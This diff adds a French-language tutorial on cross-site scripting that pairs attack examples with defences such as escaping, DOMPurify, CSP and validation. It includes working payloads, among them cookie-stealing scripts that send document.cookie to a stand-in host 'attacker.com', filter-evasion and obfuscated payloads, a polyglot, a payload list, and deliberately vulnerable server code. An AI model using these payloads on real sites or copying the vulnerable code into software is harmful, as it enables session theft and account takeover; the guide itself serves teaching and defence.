@@ -1,0 +1,937 @@
+---
+title: "XSS (Cross-Site Scripting) - Guide complet d'exploitation et de protection"
+category: "web-security"
+description: "Guide expert sur XSS : types (Reflected, Stored, DOM-based), techniques d'évasion avancées, contextes d'injection (HTML, JavaScript, CSS, URL), méthodes de protection (CSP, sanitization, encodage contextuel), exemples de code complets, outils de test et cas d'usage réels."
+coverImage: "/guides/xss.jpg"
+date: "2024-03-13"
+difficulty: "avancé"
+readingTime: "40 min"
+prerequisites: ["JavaScript", "HTML", "Développement web", "Concepts de sécurité"]
+lastUpdated: "2024-12-19"
+---
+
+# XSS (Cross-Site Scripting) - Guide complet d'exploitation et de protection
+
+Cross-Site Scripting (XSS) est une vulnérabilité qui permet à un attaquant d'injecter du code JavaScript malveillant dans une page web vue par d'autres utilisateurs. Classée dans l'OWASP Top 10 depuis sa création, XSS reste l'une des vulnérabilités web les plus répandues et dangereuses.
+
+## Introduction
+
+XSS se produit lorsque l'application inclut des données non fiables dans une page web sans les valider ou les encoder correctement. Le navigateur de la victime exécute alors le code JavaScript injecté dans le contexte de l'application, permettant à l'attaquant de :
+
+- Voler des cookies de session
+- Effectuer des actions au nom de l'utilisateur
+- Capturer des frappes au clavier (keylogging)
+- Rediriger vers des sites malveillants
+- Modifier le contenu de la page
+- Accéder au DOM et aux APIs du navigateur
+
+## Concepts fondamentaux
+
+### Principe de base
+
+XSS exploite la confiance que le navigateur accorde au contenu de la page. Quand une application insère des données utilisateur dans le HTML sans encodage, le navigateur les interprète comme du code exécutable.
+
+```javascript
+// Vulnérable
+app.get('/search', (req, res) => {
+    const query = req.query.q;
+    res.send(`<h1>Résultats pour: ${query}</h1>`);
+});
+
+// Si query = <script>alert('XSS')</script>
+// Le script sera exécuté dans le navigateur
+```
+
+### Pourquoi c'est dangereux
+
+1. **Vol de session** : Accès aux cookies de session
+2. **Usurpation d'identité** : Actions effectuées au nom de l'utilisateur
+3. **Phishing** : Modification de l'interface pour tromper l'utilisateur
+4. **Keylogging** : Capture des frappes au clavier
+5. **Défacement** : Modification du contenu de la page
+
+## Types de XSS
+
+### 1. Reflected XSS (Non-persistent)
+
+Le script malveillant est reflété immédiatement dans la réponse HTTP. L'attaquant doit convaincre la victime de visiter une URL ou de soumettre un formulaire contenant le payload.
+
+#### Mécanisme
+
+```javascript
+// Vulnérable
+app.get('/search', (req, res) => {
+    const query = req.query.q;
+    res.send(`
+        <html>
+            <body>
+                <h1>Résultats de recherche</h1>
+                <p>Vous avez recherché: ${query}</p>
+            </body>
+        </html>
+    `);
+});
+```
+
+#### Exploitation
+
+```html
+<!-- URL malveillante -->
+https://vulnerable.com/search?q=<script>alert('XSS')</script>
+
+<!-- Ou via formulaire -->
+<form action="https://vulnerable.com/search" method="GET">
+    <input type="hidden" name="q" value="<script>alert('XSS')</script>">
+    <input type="submit" value="Cliquez ici">
+</form>
+```
+
+#### Exemple d'attaque complète
+
+```javascript
+// Payload de vol de cookie
+const payload = `
+<script>
+    var img = new Image();
+    img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
+</script>
+`;
+
+// URL d'attaque
+const maliciousUrl = `https://vulnerable.com/search?q=${encodeURIComponent(payload)}`;
+
+// L'attaquant envoie ce lien à la victime
+// Quand la victime clique, son cookie est volé
+```
+
+#### Protection
+
+```javascript
+const { escape } = require('html-escaper');
+
+app.get('/search', (req, res) => {
+    const query = escape(req.query.q || '');
+    res.send(`
+        <html>
+            <body>
+                <h1>Résultats de recherche</h1>
+                <p>Vous avez recherché: ${query}</p>
+            </body>
+        </html>
+    `);
+});
+```
+
+### 2. Stored XSS (Persistent)
+
+Le script malveillant est stocké sur le serveur (base de données, fichiers) et exécuté à chaque affichage. Plus dangereux car affecte tous les utilisateurs visitant la page.
+
+#### Mécanisme
+
+```javascript
+// Vulnérable : Commentaires
+app.post('/api/comments', (req, res) => {
+    const comment = req.body.comment;
+    db.query('INSERT INTO comments (content) VALUES (?)', [comment]);
+    res.json({ success: true });
+});
+
+app.get('/api/comments', (req, res) => {
+    db.query('SELECT * FROM comments', (err, results) => {
+        res.send(`
+            <html>
+                <body>
+                    ${results.map(c => `<div>${c.content}</div>`).join('')}
+                </body>
+            </html>
+        `);
+    });
+});
+```
+
+#### Exploitation
+
+```javascript
+// L'attaquant soumet un commentaire malveillant
+const maliciousComment = `
+<script>
+    setInterval(function() {
+        var img = new Image();
+        img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
+    }, 1000);
+</script>
+`;
+
+// Le commentaire est stocké dans la base de données
+// Tous les utilisateurs qui voient les commentaires sont affectés
+```
+
+#### Protection
+
+```javascript
+const DOMPurify = require('isomorphic-dompurify');
+
+app.post('/api/comments', (req, res) => {
+    const comment = DOMPurify.sanitize(req.body.comment, {
+        ALLOWED_TAGS: [],
+        ALLOWED_ATTR: []
+    });
+    
+    db.query('INSERT INTO comments (content) VALUES (?)', [comment]);
+    res.json({ success: true });
+});
+
+app.get('/api/comments', (req, res) => {
+    db.query('SELECT * FROM comments', (err, results) => {
+        const sanitized = results.map(c => ({
+            ...c,
+            content: DOMPurify.sanitize(c.content)
+        }));
+        res.json(sanitized);
+    });
+});
+```
+
+### 3. DOM-based XSS
+
+Le script modifie le DOM côté client sans interaction serveur. Plus difficile à détecter car le serveur ne voit pas le payload.
+
+#### Mécanisme
+
+```html
+<!-- Vulnérable -->
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const name = urlParams.get('name');
+    document.getElementById('greeting').innerHTML = 'Hello ' + name;
+</script>
+
+<div id="greeting"></div>
+```
+
+#### Exploitation
+
+```html
+<!-- URL malveillante -->
+https://vulnerable.com/page?name=<img src=x onerror=alert('XSS')>
+
+<!-- Le script modifie directement le DOM -->
+```
+
+#### Protection
+
+```html
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const name = urlParams.get('name');
+    
+    // Encodage HTML
+    const encodedName = name
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#x27;');
+    
+    // Utilisation de textContent au lieu de innerHTML
+    document.getElementById('greeting').textContent = 'Hello ' + encodedName;
+</script>
+```
+
+## Contextes d'injection
+
+### 1. Contexte HTML
+
+L'injection se produit directement dans le HTML.
+
+#### Payloads d'évasion
+
+```html
+<!-- Basique -->
+<script>alert('XSS')</script>
+
+<!-- Évasion des filtres -->
+<ScRiPt>alert('XSS')</ScRiPt>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
+
+<!-- Sans balise script -->
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<div onmouseover=alert('XSS')>Hover me</div>
+
+<!-- Évasion avec encodage -->
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+
+<!-- Avec événements HTML5 -->
+<video><source onerror="alert('XSS')">
+<audio src=x onerror="alert('XSS')">
+```
+
+#### Protection
+
+```javascript
+const { escape } = require('html-escaper');
+
+function renderUserContent(content) {
+    return escape(content);
+}
+
+// Ou utiliser une bibliothèque de sanitization
+const DOMPurify = require('isomorphic-dompurify');
+
+function renderUserContent(content) {
+    return DOMPurify.sanitize(content, {
+        ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
+        ALLOWED_ATTR: []
+    });
+}
+```
+
+### 2. Contexte JavaScript
+
+L'injection se produit dans un bloc JavaScript.
+
+#### Payloads d'évasion
+
+```javascript
+// Vulnérable
+const userInput = '${req.query.name}';
+const message = 'Hello ' + userInput;
+
+// Payloads
+';alert('XSS');//
+';alert('XSS');var x='
+</script><script>alert('XSS')</script>
+';alert(String.fromCharCode(88,83,83));//
+```
+
+#### Exemple complet
+
+```javascript
+// Code vulnérable
+app.get('/page', (req, res) => {
+    const name = req.query.name;
+    res.send(`
+        <script>
+            const userName = '${name}';
+            document.write('Hello ' + userName);
+        </script>
+    `);
+});
+
+// Attaque
+// ?name=';alert('XSS');//
+// Résultat :
+// const userName = '';alert('XSS');//';
+```
+
+#### Protection
+
+```javascript
+function escapeJavaScript(str) {
+    return str
+        .replace(/\\/g, '\\\\')
+        .replace(/'/g, "\\'")
+        .replace(/"/g, '\\"')
+        .replace(/\n/g, '\\n')
+        .replace(/\r/g, '\\r')
+        .replace(/\t/g, '\\t')
+        .replace(/</g, '\\u003C')
+        .replace(/>/g, '\\u003E');
+}
+
+app.get('/page', (req, res) => {
+    const name = escapeJavaScript(req.query.name || '');
+    res.send(`
+        <script>
+            const userName = '${name}';
+            document.write('Hello ' + userName);
+        </script>
+    `);
+});
+
+// Meilleure approche : Utiliser JSON.stringify
+app.get('/page', (req, res) => {
+    const name = JSON.stringify(req.query.name || '');
+    res.send(`
+        <script>
+            const userName = ${name};
+            document.write('Hello ' + userName);
+        </script>
+    `);
+});
+```
+
+### 3. Contexte d'attribut HTML
+
+L'injection se produit dans un attribut HTML.
+
+#### Payloads d'évasion
+
+```html
+<!-- Basique -->
+<img src="x" onerror="alert('XSS')">
+
+<!-- Évasion des guillemets -->
+<img src="x" onerror="alert('XSS')">
+<img src=x onerror=alert('XSS')>
+<img src='x' onerror='alert("XSS")'>
+
+<!-- Évasion avec encodage -->
+<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
+
+<!-- Avec événements HTML5 -->
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+```
+
+#### Protection
+
+```javascript
+function escapeAttribute(str) {
+    return str
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#x27;');
+}
+
+app.get('/page', (req, res) => {
+    const imageUrl = escapeAttribute(req.query.image || '');
+    res.send(`<img src="${imageUrl}" alt="Image">`);
+});
+```
+
+### 4. Contexte URL
+
+L'injection se produit dans une URL (href, src, etc.).
+
+#### Payloads d'évasion
+
+```html
+<!-- Basique -->
+<a href="javascript:alert('XSS')">Click me</a>
+
+<!-- Évasion -->
+<a href="javascript:alert(String.fromCharCode(88,83,83))">Click me</a>
+<a href="javascript:eval(atob('YWxlcnQoJ1hTUycp'))">Click me</a>
+
+<!-- Avec encodage URL -->
+<a href="javascript:%61%6c%65%72%74%28%27%58%53%53%27%29">Click me</a>
+```
+
+#### Protection
+
+```javascript
+const { URL } = require('url');
+
+function validateUrl(urlString) {
+    try {
+        const url = new URL(urlString);
+        
+        // Autoriser uniquement http et https
+        if (!['http:', 'https:'].includes(url.protocol)) {
+            throw new Error('Invalid protocol');
+        }
+        
+        // Whitelist de domaines
+        const allowedDomains = ['example.com', 'trusted.com'];
+        if (!allowedDomains.includes(url.hostname)) {
+            throw new Error('Domain not allowed');
+        }
+        
+        return urlString;
+    } catch (error) {
+        throw new Error('Invalid URL');
+    }
+}
+
+app.get('/page', (req, res) => {
+    try {
+        const linkUrl = validateUrl(req.query.link || '');
+        res.send(`<a href="${linkUrl}">Click me</a>`);
+    } catch (error) {
+        res.status(400).send('Invalid link');
+    }
+});
+```
+
+### 5. Contexte CSS
+
+L'injection se produit dans du CSS (style inline, feuilles de style).
+
+#### Payloads d'évasion
+
+```css
+/* Basique */
+<div style="background:url('javascript:alert(\'XSS\')')">
+
+/* Avec expression (IE) */
+<div style="background:expression(alert('XSS'))">
+
+/* Avec @import */
+<style>@import 'javascript:alert("XSS")';</style>
+```
+
+#### Protection
+
+```javascript
+function sanitizeCSS(css) {
+    // Supprimer les expressions JavaScript
+    css = css.replace(/expression\s*\(/gi, '');
+    
+    // Supprimer les javascript: URLs
+    css = css.replace(/javascript:/gi, '');
+    
+    // Supprimer les @import
+    css = css.replace(/@import/gi, '');
+    
+    return css;
+}
+
+app.get('/page', (req, res) => {
+    const userStyle = sanitizeCSS(req.query.style || '');
+    res.send(`<div style="${userStyle}">Content</div>`);
+});
+```
+
+## Techniques d'évasion avancées
+
+### 1. Encodage et obfuscation
+
+```javascript
+// Encodage Base64
+eval(atob('YWxlcnQoJ1hTUycp'))
+
+// Encodage hexadécimal
+eval('\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29')
+
+// Encodage Unicode
+eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029')
+
+// String.fromCharCode
+eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))
+
+// Concatenation
+'a'+'l'+'e'+'r'+'t'+'('+"'"+'X'+'S'+'S'+"'"+')'
+```
+
+### 2. Évasion des filtres
+
+```javascript
+// Casse mixte
+<ScRiPt>alert('XSS')</ScRiPt>
+
+// Sans espaces
+<script>alert('XSS')</script>
+
+// Avec tabulations et retours à la ligne
+<script>
+alert('XSS')
+</script>
+
+// Commentaires HTML
+<script><!--alert('XSS')--></script>
+
+// Encodage d'entités
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+// Encodage hexadécimal
+&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;
+```
+
+### 3. Polyglots XSS
+
+Payloads qui fonctionnent dans plusieurs contextes :
+
+```html
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
+```
+
+## Techniques de protection
+
+### 1. Content Security Policy (CSP)
+
+CSP est un mécanisme de sécurité qui permet de contrôler quelles ressources peuvent être chargées et exécutées.
+
+#### Configuration de base
+
+```javascript
+const helmet = require('helmet');
+
+app.use(helmet.contentSecurityPolicy({
+    directives: {
+        defaultSrc: ["'self'"],
+        scriptSrc: ["'self'"],
+        styleSrc: ["'self'", "'unsafe-inline'"],
+        imgSrc: ["'self'", "data:", "https:"],
+        connectSrc: ["'self'"],
+        fontSrc: ["'self'"],
+        objectSrc: ["'none'"],
+        mediaSrc: ["'self'"],
+        frameSrc: ["'none'"],
+        baseUri: ["'self'"],
+        formAction: ["'self'"],
+        upgradeInsecureRequests: []
+    }
+}));
+```
+
+#### CSP strict
+
+```javascript
+app.use(helmet.contentSecurityPolicy({
+    directives: {
+        defaultSrc: ["'self'"],
+        scriptSrc: ["'self'"],
+        styleSrc: ["'self'"],
+        imgSrc: ["'self'", "data:"],
+        connectSrc: ["'self'"],
+        fontSrc: ["'self'"],
+        objectSrc: ["'none'"],
+        mediaSrc: ["'self'"],
+        frameSrc: ["'none'"],
+        baseUri: ["'self'"],
+        formAction: ["'self'"],
+        upgradeInsecureRequests: [],
+        blockAllMixedContent: true
+    },
+    reportOnly: false
+}));
+```
+
+#### Nonces CSP
+
+```javascript
+const crypto = require('crypto');
+
+app.use((req, res, next) => {
+    res.locals.nonce = crypto.randomBytes(16).toString('base64');
+    next();
+});
+
+app.use(helmet.contentSecurityPolicy({
+    directives: {
+        scriptSrc: [
+            "'self'",
+            (req, res) => `'nonce-${res.locals.nonce}'`
+        ]
+    }
+}));
+
+// Dans le template
+app.get('/page', (req, res) => {
+    res.send(`
+        <script nonce="${res.locals.nonce}">
+            // Code sécurisé
+        </script>
+    `);
+});
+```
+
+### 2. Sanitization
+
+Nettoyer les entrées utilisateur pour supprimer le code malveillant.
+
+#### DOMPurify
+
+```javascript
+const DOMPurify = require('isomorphic-dompurify');
+
+// Sanitization complète
+const clean = DOMPurify.sanitize(dirty, {
+    ALLOWED_TAGS: [],
+    ALLOWED_ATTR: []
+});
+
+// Sanitization avec tags autorisés
+const clean = DOMPurify.sanitize(dirty, {
+    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
+    ALLOWED_ATTR: ['href'],
+    ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i
+});
+```
+
+#### Sanitization personnalisée
+
+```javascript
+function sanitizeHTML(input) {
+    if (typeof input !== 'string') {
+        return '';
+    }
+    
+    return input
+        .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
+        .replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, '')
+        .replace(/on\w+\s*=\s*["'][^"']*["']/gi, '')
+        .replace(/javascript:/gi, '')
+        .replace(/data:text\/html/gi, '');
+}
+```
+
+### 3. Encodage contextuel
+
+Encoder les sorties selon le contexte où elles sont utilisées.
+
+#### Encodage HTML
+
+```javascript
+function escapeHTML(str) {
+    if (typeof str !== 'string') {
+        return str;
+    }
+    
+    return str
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#x27;')
+        .replace(/\//g, '&#x2F;');
+}
+```
+
+#### Encodage JavaScript
+
+```javascript
+function escapeJavaScript(str) {
+    if (typeof str !== 'string') {
+        return JSON.stringify(str);
+    }
+    
+    return str
+        .replace(/\\/g, '\\\\')
+        .replace(/'/g, "\\'")
+        .replace(/"/g, '\\"')
+        .replace(/\n/g, '\\n')
+        .replace(/\r/g, '\\r')
+        .replace(/\t/g, '\\t')
+        .replace(/</g, '\\u003C')
+        .replace(/>/g, '\\u003E');
+}
+
+// Meilleure approche : Utiliser JSON.stringify
+function escapeJavaScript(str) {
+    return JSON.stringify(str);
+}
+```
+
+#### Encodage d'attribut
+
+```javascript
+function escapeAttribute(str) {
+    if (typeof str !== 'string') {
+        return '';
+    }
+    
+    return str
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#x27;');
+}
+```
+
+#### Encodage URL
+
+```javascript
+function escapeURL(str) {
+    return encodeURIComponent(str);
+}
+```
+
+### 4. Utilisation d'APIs sécurisées
+
+```javascript
+// Vulnérable
+element.innerHTML = userInput;
+
+// Sécurisé
+element.textContent = userInput;
+
+// Vulnérable
+document.write(userInput);
+
+// Sécurisé
+const textNode = document.createTextNode(userInput);
+element.appendChild(textNode);
+
+// Vulnérable
+eval(userInput);
+
+// Sécurisé : Ne jamais utiliser eval avec des entrées utilisateur
+// Utiliser des alternatives comme JSON.parse si nécessaire
+```
+
+### 5. Validation stricte
+
+```javascript
+const { z } = require('zod');
+
+const usernameSchema = z.string()
+    .min(3)
+    .max(50)
+    .regex(/^[a-zA-Z0-9_]+$/)
+    .refine(val => !val.includes('<') && !val.includes('>'), {
+        message: 'Invalid characters'
+    });
+
+app.post('/api/user', (req, res) => {
+    try {
+        const username = usernameSchema.parse(req.body.username);
+        // Traitement sécurisé
+    } catch (error) {
+        res.status(400).json({ error: 'Invalid username' });
+    }
+});
+```
+
+## Outils de test et détection
+
+### Burp Suite
+
+1. Intercepter la requête avec Burp Proxy
+2. Envoyer à XSS Scanner
+3. Analyser les résultats
+4. Tester manuellement avec Repeater
+
+### OWASP ZAP
+
+```bash
+# Scan automatique
+zap-cli quick-scan http://target.com
+
+# Scan XSS spécifique
+zap-cli active-scan --scanners xss http://target.com
+```
+
+### XSSer
+
+```bash
+# Installation
+git clone https://github.com/epsylon/xsser.git
+cd xsser
+python xsser.py
+
+# Utilisation
+python xsser.py -u "http://target.com/search?q=XSS" --auto
+```
+
+### Tests manuels
+
+```javascript
+// Script de test Node.js
+const axios = require('axios');
+
+const xssPayloads = [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg onload=alert('XSS')>",
+    "javascript:alert('XSS')",
+    "<body onload=alert('XSS')>",
+    "<iframe src=javascript:alert('XSS')>",
+    "<input onfocus=alert('XSS') autofocus>",
+    "<select onfocus=alert('XSS') autofocus>",
+    "<textarea onfocus=alert('XSS') autofocus>",
+    "<keygen onfocus=alert('XSS') autofocus>",
+    "<video><source onerror=alert('XSS')>",
+    "<audio src=x onerror=alert('XSS')>",
+    "<details open ontoggle=alert('XSS')>",
+    "<marquee onstart=alert('XSS')>",
+    "<div onmouseover=alert('XSS')>",
+    "<style>@import'javascript:alert(\"XSS\")';</style>"
+];
+
+async function testXSS(url, param) {
+    for (const payload of xssPayloads) {
+        try {
+            const response = await axios.get(url, {
+                params: { [param]: payload }
+            });
+            
+            if (response.data.includes(payload) && 
+                !response.data.includes(escapeHTML(payload))) {
+                console.log(`Potential XSS: ${payload}`);
+            }
+        } catch (error) {
+            console.error(`Error testing ${payload}:`, error.message);
+        }
+    }
+}
+```
+
+## Cas d'usage réels
+
+### MySpace (2005)
+
+Samy Kamkar a créé un ver XSS qui s'est propagé à plus d'un million d'utilisateurs en quelques heures. Le ver ajoutait automatiquement Samy comme ami à tous les profils visités.
+
+**Leçons apprenées :**
+- Importance de la sanitization des entrées utilisateur
+- Nécessité de protections contre l'auto-propagation
+- Impact des XSS stockés
+
+### Twitter (2010)
+
+Un XSS stocké a permis à des attaquants de voler des cookies de session et de prendre le contrôle de comptes Twitter.
+
+### eBay (2014)
+
+Un XSS a permis à des attaquants d'injecter du code malveillant dans les pages de produits, volant les identifiants des utilisateurs.
+
+## Bonnes pratiques
+
+### Checklist de sécurité
+
+- [ ] Encoder toutes les sorties selon leur contexte (HTML, JavaScript, CSS, URL)
+- [ ] Implémenter Content Security Policy (CSP)
+- [ ] Sanitizer toutes les entrées utilisateur avec DOMPurify ou équivalent
+- [ ] Utiliser des APIs sécurisées (textContent au lieu de innerHTML)
+- [ ] Valider strictement toutes les entrées
+- [ ] Ne jamais utiliser eval() avec des entrées utilisateur
+- [ ] Utiliser des nonces CSP pour les scripts inline
+- [ ] Tester régulièrement avec des outils automatisés
+- [ ] Former les développeurs aux risques XSS
+- [ ] Implémenter le logging des tentatives XSS
+- [ ] Utiliser des frameworks qui encodent automatiquement (React, Vue, etc.)
+- [ ] Configurer correctement les headers de sécurité
+- [ ] Effectuer des code reviews réguliers
+- [ ] Implémenter la détection d'anomalies
+
+### Code review checklist
+
+- [ ] Vérifier l'absence de innerHTML avec des entrées utilisateur
+- [ ] S'assurer que toutes les sorties sont encodées
+- [ ] Vérifier l'implémentation de CSP
+- [ ] Examiner l'utilisation de eval(), setTimeout(), setInterval()
+- [ ] Vérifier la sanitization des entrées
+- [ ] Examiner les contextes d'injection possibles
+
+## Conclusion
+
+XSS reste une menace majeure malgré sa connaissance depuis des décennies. La protection efficace nécessite :
+
+1. **Encodage contextuel systématique** : Encoder selon le contexte d'utilisation
+2. **Content Security Policy** : Contrôler les ressources exécutables
+3. **Sanitization appropriée** : Nettoyer les entrées utilisateur
+4. **Utilisation d'APIs sécurisées** : Éviter les APIs dangereuses
+5. **Validation stricte** : Valider toutes les entrées
+
+Une approche en couches combinant ces techniques offre la meilleure protection contre les attaques XSS.
+
+## Références techniques
+
+- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [OWASP DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
+- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
+- [PortSwigger Web Security Academy - XSS](https://portswigger.net/web-security/cross-site-scripting)
+- [DOMPurify](https://github.com/cure53/DOMPurify)
+- [HTML5 Security Cheat Sheet](https://html5sec.org/)
